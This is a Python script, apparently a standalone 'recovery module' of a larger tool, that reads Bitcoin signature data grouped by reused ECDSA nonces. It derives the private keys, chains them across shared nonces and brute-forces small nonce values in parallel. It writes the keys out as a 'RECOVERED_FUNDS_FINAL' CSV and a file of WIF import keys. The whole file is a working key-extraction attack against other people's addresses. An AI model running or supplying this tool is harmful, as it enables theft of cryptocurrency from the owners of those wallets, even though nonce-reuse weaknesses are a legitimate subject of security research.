import os
import sys
import re
import csv
import hashlib
import argparse
import concurrent.futures
from typing import List, Dict, Any, Optional, Tuple

# ==============================================================================
# DEPENDENCY CHECKS
# ==============================================================================
try:
    import ecdsa
    from ecdsa import SECP256k1 as curve
except ImportError:
    print("Error: 'ecdsa' library not found. Please run: pip install ecdsa")
    sys.exit(1)

def calc_ripemd160(data: bytes) -> bytes:
    """Robust RIPEMD160 calculator. Falls back to pycryptodome if hashlib fails."""
    try:
        return hashlib.new('ripemd160', data).digest()
    except ValueError:
        try:
            from Crypto.Hash import RIPEMD160
            h = RIPEMD160.new(data=data)
            return h.digest()
        except ImportError:
            print("\n[CRITICAL ERROR] Your system's OpenSSL has disabled RIPEMD160.")
            print("You MUST install pycryptodome to run this script.")
            print("Command: pip install pycryptodome")
            sys.exit(1)

# ==============================================================================
# CONFIGURATION CONSTANTS
# ==============================================================================
DEFAULT_OUTPUT_R_NON = os.path.join("reports", "rnon.txt")
OUTPUT_CSV = "RECOVERED_FUNDS_FINAL.csv"
OUTPUT_WIF = "wallet_import_keys_final.txt"
CHARSET = "qpzry9x8gf2tvdw0s3jn54khce6mua7l" # Bech32 charset
N = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141

# ==============================================================================
# CRYPTOGRAPHY / ADDRESS FORMATTING
# ==============================================================================
def bech32_polymod(values: List[int]) -> int:
    generator = [0x3b6a57b2, 0x26508e6d, 0x1ea119fa, 0x3d4233dd, 0x2a1462b3]
    chk = 1
    for value in values:
        top = chk >> 25
        chk = (chk & 0x1ffffff) << 5 ^ value
        for i in range(5):
            chk ^= generator[i] if ((top >> i) & 1) else 0
    return chk

def bech32_hrp_expand(hrp: str) -> List[int]:
    return [ord(x) >> 5 for x in hrp] + [0] + [ord(x) & 31 for x in hrp]

def bech32_create_checksum(hrp: str, data: List[int]) -> List[int]:
    values = bech32_hrp_expand(hrp) + data
    polymod = bech32_polymod(values + [0, 0, 0, 0, 0, 0]) ^ 1
    return [(polymod >> 5 * (5 - i)) & 31 for i in range(6)]

def bech32_encode(hrp: str, data: List[int]) -> str:
    combined = data + bech32_create_checksum(hrp, data)
    return hrp + '1' + ''.join([CHARSET[d] for d in combined])

def convertbits(data: bytes, frombits: int, tobits: int, pad: bool = True) -> Optional[List[int]]:
    acc = 0
    bits = 0
    ret = []
    maxv = (1 << tobits) - 1
    max_acc = (1 << (frombits + tobits - 1)) - 1
    for value in data:
        if value < 0 or (value >> frombits): return None
        acc = ((acc << frombits) | value) & max_acc
        bits += frombits
        while bits >= tobits:
            bits -= tobits
            ret.append((acc >> bits) & maxv)
    if pad:
        if bits: 
            ret.append((acc << (tobits - bits)) & maxv)
    elif bits >= frombits or ((acc << (tobits - bits)) & maxv): 
        return None
    return ret

def base58_encode(b: bytes) -> str:
    alphabet = "123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz"
    x = int.from_bytes(b, "big")
    out = []
    while x > 0:
        x, rem = divmod(x, 58)
        out.append(alphabet[rem])
    for byte in b:
        if byte == 0: out.append("1")
        else: break
    return "".join(reversed(out))

def priv_to_wif(priv_hex: str, compressed: bool = True) -> str:
    priv = bytes.fromhex("80" + priv_hex)
    if compressed: 
        priv += b"\x01"
    chk = hashlib.sha256(hashlib.sha256(priv).digest()).digest()[:4]
    return base58_encode(priv + chk)

def pub_to_addresses(pub_hex: str) -> Tuple[str, str, str]:
    pub_bytes = bytes.fromhex(pub_hex)
    sha = hashlib.sha256(pub_bytes).digest()
    
    ripe = calc_ripemd160(sha)
    
    # 1. P2PKH (Legacy)
    p2pkh = base58_encode(b"\x00" + ripe + hashlib.sha256(hashlib.sha256(b"\x00" + ripe).digest()).digest()[:4])
    
    # 2. P2WPKH (Native SegWit - Bech32)
    witness_prog = convertbits(ripe, 8, 5)
    p2wpkh = ""
    if witness_prog is not None:
        p2wpkh = bech32_encode("bc", [0] + witness_prog)
    
    # 3. P2SH-P2WPKH (Nested SegWit)
    redeem = b"\x00\x14" + ripe
    sha_r = hashlib.sha256(redeem).digest()
    ripe_r = calc_ripemd160(sha_r)
    p2sh = base58_encode(b"\x05" + ripe_r + hashlib.sha256(hashlib.sha256(b"\x05" + ripe_r).digest()).digest()[:4])
    
    return p2pkh, p2wpkh, p2sh

# ==============================================================================
# ECDSA MATH
# ==============================================================================
def modinv(a: int, m: int = N) -> int:
    a = a % m
    if a == 0:
        raise ValueError("gcd(a, m) != 1")
    return pow(a, -1, m)

def verify_key(pub_hex: str, priv_int: int) -> bool:
    if priv_int <= 0 or priv_int >= N: 
        return False
    try:
        sk = ecdsa.SigningKey.from_secret_exponent(priv_int, curve=curve)
        vk = sk.verifying_key
        pt = vk.pubkey.point
        
        x_bytes = pt.x().to_bytes(32, 'big')
        if pub_hex.startswith('04') and len(pub_hex) == 130:
            y_bytes = pt.y().to_bytes(32, 'big')
            generated_pub = (b'\x04' + x_bytes + y_bytes).hex()
        else:
            prefix = b'\x02' if pt.y() % 2 == 0 else b'\x03'
            generated_pub = (prefix + x_bytes).hex()
            
        return generated_pub == pub_hex.lower()
    except Exception:
        return False

def attempt_bootstrap(r: int, s1: int, z1: int, s2: int, z2: int) -> List[int]:
    """Recover private key from two signatures with the SAME key and SAME nonce."""
    candidates = []
    s1_opts = [s1, N - s1]
    s2_opts = [s2, N - s2]
    
    for _s1 in s1_opts:
        for _s2 in s2_opts:
            if _s1 == _s2: 
                continue
            try:
                # k = (z1 - z2) / (s1 - s2) mod N
                k = ((z1 - z2) * modinv(_s1 - _s2, N)) % N
                # d = (s1 * k - z1) / r mod N
                d = ((_s1 * k - z1) * modinv(r, N)) % N
                candidates.append(d)
            except ValueError:
                pass
    return candidates

def attempt_chain(r: int, s_known: int, z_known: int, d_known: int, s_target: int, z_target: int) -> List[int]:
    """Recover private key for a target using a known key from the SAME nonce group."""
    candidates = []
    s_known_opts = [s_known, N - s_known]
    s_target_opts = [s_target, N - s_target]
    
    for _sk in s_known_opts:
        try:
            # k = (z_known + r * d_known) / s_known mod N
            k = ((z_known + r * d_known) * modinv(_sk, N)) % N
            for _st in s_target_opts:
                # d_target = (s_target * k - z_target) / r mod N
                d2 = ((_st * k - z_target) * modinv(r, N)) % N
                candidates.append(d2)
        except ValueError:
            pass
    return candidates

def brute_force_k(r: int, s: int, z: int, pub: str, max_k: int) -> Optional[Tuple[int, int]]:
    """Attempt a simple sequential brute-force on K. Returns (K, D)."""
    try:
        r_inv = modinv(r, N)
    except ValueError:
        return None
        
    for k in range(1, max_k + 1):
        d = ((k * s - z) * r_inv) % N
        if d > 0 and verify_key(pub, d):
            return k, d
    return None

# ==============================================================================
# RECOVERY EXECUTION ENGINE
# ==============================================================================
def run_recovery(input_file: str, brute_max_k: int = 0):
    print("[-] Reading and Parsing File...")
    try:
        with open(input_file, "r", encoding="utf-8", errors="ignore") as f:
            raw_data = f.read()
    except FileNotFoundError:
        print(f"[!] File '{input_file}' not found! No vulnerable addresses found yet.")
        return

    parsed_groups = []
    raw_blocks = re.split(r"={10,}", raw_data)

    for block in raw_blocks:
        r_match = re.search(r"r:\s*([a-f0-9]{1,64})", block, re.IGNORECASE)
        if not r_match: 
            continue
        r_hex = r_match.group(1).lower()
        
        txs = re.findall(r"s=([a-f0-9]+)[\s\S]*?z=([a-f0-9]+)[\s\S]*?pubkey=([a-f0-9]+)", block, re.IGNORECASE)
        
        valid_txs = []
        for s, z, pub in txs:
            if z != "N/A" and pub != "N/A": 
                valid_txs.append((s, z, pub))

        if len(valid_txs) >= 2:
            parsed_groups.append({"r": int(r_hex, 16), "txs": valid_txs})

    print(f"[-] Loaded {len(parsed_groups)} groups for analysis.")

    recovered_db: Dict[str, int] = {}
    found_something = True
    iteration = 0

    print("\n[+] STARTING RECOVERY ENGINE...")

    while found_something:
        iteration += 1
        found_something = False
        print(f"--- Iteration {iteration} (Keys Found: {len(recovered_db)}) ---")
        
        for group in parsed_groups:
            r = group['r']
            txs = group['txs']
            
            # Map signatures by public key to eliminate strict duplicates
            pub_map: Dict[str, List[Tuple[int, int]]] = {}
            for s_hex, z_hex, pub in txs:
                pub = pub.lower()
                s_int, z_int = int(s_hex, 16), int(z_hex, 16)
                if pub not in pub_map: 
                    pub_map[pub] = []
                if (s_int, z_int) not in pub_map[pub]:
                    pub_map[pub].append((s_int, z_int))
                
            # 1. Bootstrap: Two or more unique signatures for the SAME pubkey
            for pub, entries in pub_map.items():
                if pub in recovered_db: 
                    continue
                # We need at least 2 distinct signatures from the same pubkey
                if len(entries) >= 2:
                    # Test pairwise to find a successful bootstrap
                    for i in range(len(entries)):
                        for j in range(i + 1, len(entries)):
                            s1, z1 = entries[i]
                            s2, z2 = entries[j]
                            candidates = attempt_bootstrap(r, s1, z1, s2, z2)
                            for d in candidates:
                                if verify_key(pub, d):
                                    recovered_db[pub] = d
                                    print(f"   [BOOTSTRAP SUCCESS] Key found: {pub[:16]}...")
                                    found_something = True
                                    break
                            if pub in recovered_db:
                                break
                        if pub in recovered_db:
                            break
            
            # 2. Chain: Use a known key in this group to unlock other target keys
            master_params = None
            # Find the first valid known key in this group
            for s_hex, z_hex, pub in txs:
                pub = pub.lower()
                if pub in recovered_db:
                    master_params = (int(s_hex, 16), int(z_hex, 16), recovered_db[pub])
                    break
            
            if master_params:
                s_known, z_known, d_known = master_params
                for s_target_hex, z_target_hex, pub_target in txs:
                    pub_target = pub_target.lower()
                    if pub_target in recovered_db: 
                        continue
                    s_t = int(s_target_hex, 16)
                    z_t = int(z_target_hex, 16)
                    candidates = attempt_chain(r, s_known, z_known, d_known, s_t, z_t)
                    for d in candidates:
                        if verify_key(pub_target, d):
                            recovered_db[pub_target] = d
                            print(f"   [CHAINED] Unlocked: {pub_target[:16]}...")
                            found_something = True
                            break

    if brute_max_k > 0:
        print(f"\n[+] STARTING K-VALUE BRUTE FORCE ON UNRECOVERED KEYS (Limit: {brute_max_k})...")
        
        # Collect ONE signature per reused nonce group (since K is identical for the group)
        targets = []
        for idx, group in enumerate(parsed_groups):
            r = group['r']
            for s_hex, z_hex, pub in group['txs']:
                pub = pub.lower()
                if pub not in recovered_db:
                    targets.append((idx, r, int(s_hex, 16), int(z_hex, 16), pub, brute_max_k))
                    break # We only need to brute-force ONE signature per K-group
        
        if targets:
            print(f"   [BRUTE-FORCE] Testing {len(targets)} unique nonces concurrently. Please wait...")
            
            # Spawn worker processes across available cores
            with concurrent.futures.ProcessPoolExecutor() as executor:
                future_to_info = {
                    executor.submit(brute_force_k, r, s, z, pub, max_k): (idx, pub)
                    for (idx, r, s, z, pub, max_k) in targets
                }
                
                for future in concurrent.futures.as_completed(future_to_info):
                    idx, pub = future_to_info[future]
                    try:
                        res = future.result()
                        if res:
                            k_found, d = res
                            recovered_db[pub] = d
                            print(f"      -> [SUCCESS] K={k_found} found for {pub[:16]}!")
                            
                            # Unlock all other records in this group since K is identical
                            group = parsed_groups[idx]
                            r = group['r']
                            r_inv = modinv(r, N)
                            for s_target_hex, z_target_hex, pub_target in group['txs']:
                                pub_target = pub_target.lower()
                                if pub_target not in recovered_db:
                                    s_t, z_t = int(s_target_hex, 16), int(z_target_hex, 16)
                                    d_t = ((k_found * s_t - z_t) * r_inv) % N
                                    if verify_key(pub_target, d_t):
                                        recovered_db[pub_target] = d_t
                                        print(f"         └─ [CHAINED] Unlocked: {pub_target[:16]}...")
                        else:
                            print(f"      -> [FAILED] Exhausted limit for K-Group {idx} ({pub[:16]}...)")
                    except Exception as exc:
                        print(f"      -> [ERROR] Exception testing {pub[:16]}: {exc}")

    print(f"\n[+] SCAN FINISHED. Total Private Keys: {len(recovered_db)}")

    if len(recovered_db) > 0:
        with open(OUTPUT_CSV, "w", newline="") as f:
            w = csv.writer(f)
            w.writerow(["Public Key", "Private Key Hex", "WIF", "Type", "P2PKH", "P2WPKH", "P2SH"])
            wif_list = []
            for pub, priv_int in recovered_db.items():
                priv_hex = hex(priv_int)[2:].zfill(64)
                
                if pub.startswith('04') and len(pub) == 130:
                    is_compressed = False
                    key_type = "Uncompressed"
                else:
                    is_compressed = True
                    key_type = "Compressed"
                
                wif = priv_to_wif(priv_hex, compressed=is_compressed)
                a1, a2, a3 = pub_to_addresses(pub)
                w.writerow([pub, priv_hex, wif, key_type, a1, a2, a3])
                wif_list.append(wif)
                
        with open(OUTPUT_WIF, "w") as f:
            f.write("\n".join(wif_list))
        print(f"Data saved to {OUTPUT_CSV} and {OUTPUT_WIF}")
    else:
        print("No keys found.")

def main():
    parser = argparse.ArgumentParser(description="Bitcoin RSZ Key Recovery module")
    parser.add_argument("-i", "--input", type=str, default=DEFAULT_OUTPUT_R_NON, 
                        help=f"Input rnon.txt file (default: {DEFAULT_OUTPUT_R_NON})")
    parser.add_argument("-k", "--max-k", nargs='?', type=int, const=10000, default=0,
                        help="Optional maximum K value to brute force (e.g. -k 50000). Omitting the value defaults to 10000. Omitting the flag entirely disables brute-forcing.")
    args = parser.parse_args()
    
    print("="*80)
    print("STARTING RECOVERY MODULE (Standalone)")
    print("="*80 + "\n")
    
    run_recovery(args.input, args.max_k)

if __name__ == "__main__":
    main()
